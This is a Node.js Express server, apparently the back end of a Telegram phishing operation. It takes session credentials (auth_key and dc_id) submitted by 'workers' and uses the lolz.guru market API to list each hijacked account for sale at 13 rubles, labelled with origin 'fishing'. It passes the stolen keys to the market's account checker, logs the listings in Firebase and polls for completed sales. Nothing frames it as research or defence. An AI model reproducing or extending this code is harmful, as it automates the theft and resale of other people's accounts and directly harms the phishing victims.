const express = require("express");
const { ref, get, child, set, update } = require("firebase/database");

const config = require("../config");
const app = express();
const db = require("../database");
const axios = require("axios");

app.use(express.json());

let updates = [];
let selledAccs = [];
let accsQueue = [];

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

const getUpdates = async () => {
    try {
        const selledAccs_data_now = await axios.get(`https://api.lolz.guru/market/user/${config.lolzId}/items?oauth_token=${config.lolzToken}&show=paid`);
        const selledAccs_now = selledAccs_data_now.data.items;

        if (selledAccs.length == 0) selledAccs = selledAccs_now.map(selledAcc => selledAcc.item_id);

        for (let selledAcc of selledAccs_now) {
            if (selledAcc.item_id == selledAccs[0]) {
                if(selledAccs_now.length != selledAccs.length) console.log("блять");
                break;
            }

            console.log({
                "type": "accSelled",
                "accLink": `https://lolz.guru/market/${selledAcc.item_id}`,
                "price": selledAcc.price
            })

            updates.push({
                "type": "accSelled",
                "accLink": `https://lolz.guru/market/${selledAcc.item_id}`,
                "price": selledAcc.price
            });
        }

        selledAccs = selledAccs_now.map(selledAcc => selledAcc.item_id);

        console.log("Get updates!");
        return;
    }
    catch {

    }
}

const checkUpdates = new Promise(async (reslove, reject) => {
    while(true)
    {
        await getUpdates();
        await sleep(1000);
    }
})

 Promise.all([checkUpdates])

app.get("/getUpdates", async (req, res) => {
    res.status(200).send(updates);
    updates = []
})

app.post("/newAccount", async(req, res) =>
{
    const { worker_id, auth_key, dc_id } = req.body;
    console.log(worker_id)
    console.log(auth_key)
    console.log(dc_id)

    const id = 1;

    updates.push({type: "newAccount", worker_id, id});
    console.log(updates);

    res.status(200);

    accsQueue.push(id);

    while(accsQueue[0] != id) {
        await sleep(100);
        continue;
    }

    await sleep(2000);

    let accountData;

    while(true) {
        try {
            accountData = await axios.post(`https://api.lolz.guru/market/item/add`, null, {params: {
                    "category_id": 24,
                    "currency": "rub",
                    "item_origin": "fishing",
                    "extended_guarantee": 0,
                    "price": 13,
                    "title": "Телеграм // фишинг // 13 рублей",
                    "title_en": "Telegram // Fishing // 13 rub"
            }, headers: {"Authorization": `Bearer ${config.lolzToken}`}})

            break;
        }
        catch (e)
        {
            console.log(e.response.data)
            console.log(e.response.status)
            console.log("429");
            await sleep(1000);
            continue;
        }
    }

    await sleep(2000);

    console.log(accountData.data)
    const { item_id } = accountData.data.item;

    let accountChecked = "0";

    while(true){
        try {
            accountChecked = await axios.post(`https://api.lolz.guru/market/${item_id}/goods/check`, null,{ params: {
                login: auth_key,
                password: dc_id
            }, headers: {"Authorization": `Bearer ${config.lolzToken}`}});

            console.log("!");

            break;
        }
        catch(e) {
            await sleep(1000);
        }
    }

    console.log(accountChecked)
    if(accountChecked.data?.status != "ok") accountChecked = "0";

    if(accountChecked == "0") { updates.push({type: "accCantSell", worker_id, id}); console.log(updates); return; }

    console.log(accountChecked.data)

    const accountsOnSell = await get(child(ref(db), `/accountsOnSell`));
    let accountsSell = accountsOnSell.val();

    if(accountsSell == null) accountsSell = {}

    accountsSell[item_id] = {worker_id, id};

    await update(child(ref(db), `accountsOnSell`), accountsSell)
    updates.push({type: "accAddedOnSell", "accLink": `https://lolz.guru/market/${item_id}`, item_id, "price": 13, worker_id, id})
})

app.listen(5000);